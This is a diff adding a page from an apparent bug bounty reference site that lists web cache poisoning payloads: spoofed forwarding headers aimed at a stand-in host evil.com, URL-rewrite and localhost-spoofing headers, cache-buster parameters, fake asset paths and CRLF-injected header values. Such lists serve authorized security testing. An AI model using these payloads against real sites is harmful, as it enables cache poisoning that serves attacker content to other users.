@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cache Poisoning Payloads - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../index.html" class="nav-logo">
+                <img src="../logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle"><i class="fas fa-bars"></i></button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="../index.html" class="nav-link">Home</a></li>
+                <li><a href="../payloads.html" class="nav-link">Payloads</a></li>
+                <li><a href="index.html" class="nav-link active">Payloads Folder</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="../index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <a href="../payloads.html">Payloads</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>cache-poisoning-payloads.txt</span>
+        </div>
+        <h1><i class="fas fa-bolt"></i> Cache Poisoning Payloads</h1>
+        <p>Web cache poisoning attack payloads and headers.</p>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-file-alt"></i> File Contents</h2>
+                <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                    <button class="copy-btn">Copy All</button>
+                    <pre id="file-content">X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Original-URL: /evil
+X-Rewrite-URL: /evil
+X-Forwarded-For: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Forwarded-Proto: http
+X-Forwarded-Scheme: http
+X-Forwarded-Port: 80
+Forwarded: host=evil.com
+Forwarded: for=127.0.0.1
+
+?cb=evil
+?cachebust=evil
+?utm_source=evil
+?utm_campaign=evil
+
+/evil.css
+/evil.js
+/evil.png
+/evil.jpg
+/evil.json
+
+%0d%0aX-Forwarded-Host:evil.com
+%0d%0aX-Host:evil.com</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-link"></i> Related</h2>
+                <a href="../cache-poisoning.html" class="btn btn-primary">Cache Poisoning Guide</a>
+                <a href="../cache-poisoning-payloads.html" class="btn btn-secondary" style="margin-left: 0.5rem;">Main Cache Poisoning Page</a>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+        </div>
+    </footer>
+
+    <div id="toast" class="toast">Copied to clipboard!</div>
+    <script src="../script.js"></script>
+</body>
+</html>
